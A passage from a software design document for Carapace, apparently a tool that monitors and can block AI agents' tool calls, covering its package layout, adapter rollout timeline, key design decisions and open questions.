│   │   │   ├── proxy.ts        # MCP proxy server
│   │   │   └── interceptor.ts  # tools/call interceptor
│   │   └── package.json
│   │
│   └── cli/                    # @carapace/cli
│       ├── src/
│       │   ├── commands/       # CLI command implementations
│       │   └── index.ts
│       └── package.json
│
├── carapace-py/                 # Python bridge package (pip)
│   ├── carapace/
│   │   ├── __init__.py
│   │   ├── monitor.py          # Core monitor (launches Node.js)
│   │   ├── langchain.py        # LangChain callback handler
│   │   ├── crewai.py           # CrewAI callback handler
│   │   └── autogen.py          # AutoGen hook handler
│   └── pyproject.toml
│
├── turbo.json                   # Monorepo task orchestration
└── package.json                 # Workspace root
```

### 16.7 Adapter Development Timeline

| Phase | Adapter | Effort | Rationale |
|---|---|---|---|
| MVP (Weeks 1–6) | OpenClaw | 6 weeks | Largest community, best hook API, native TS |
| v0.2 (Months 2–3) | MCP Proxy | 2 weeks | Universal, works with any MCP agent |
| v0.3 (Months 3–4) | LangChain | 3 weeks | Largest Python agent framework, needs Python bridge |
| v0.4 (Months 4–5) | CrewAI | 1 week | Reuse Python bridge, similar callback model |
| v0.5 (Months 5–6) | AutoGen | 1 week | Reuse Python bridge |

### 16.8 Key Design Decisions

**Q: Why not write everything in Python to avoid the bridge?**
A: OpenClaw (MVP target) is Node.js. The rule engine and event processing benefit from TypeScript's type safety. The Python bridge adds ~50ms latency per call, which is negligible given that LLM calls take seconds. Core in TS with thin Python shims is the optimal balance.

**Q: Why a monorepo?**
A: Shared rule definitions, shared test fixtures, atomic version releases. Users install only the adapter they need — `@carapace/core` is always a dependency, but adapter packages are small.

**Q: What if a framework doesn't support pre-execution hooks (can't block)?**
A: Carapace degrades gracefully — runs in "monitor-only" mode for that framework. Alerts still fire, but calls can't be blocked. The adapter interface makes `blockCall()` optional for this reason.

---

## 17. Open Questions

1. **Should Carapace register its own OpenClaw tool?** (e.g., a `carapace_report` tool that lets the agent self-audit)
2. **How to handle skills that inherently need broad access?** (e.g., a file manager skill needs to read arbitrary paths)
3. **Should Carapace integrate with OpenClaw's existing Tool Policy system?** (Auto-generate deny lists from detected threats)
4. **Multi-framework adapters**: When to start the LangChain/CrewAI adapter layer? After v0.2 or earlier?
5. **Telemetry opt-in**: Anonymous usage data to improve rule patterns — worth the trust cost?

---

*Document version: 0.1.0*
*Last updated: 2026-03-10*
*Author: Albert Yang*
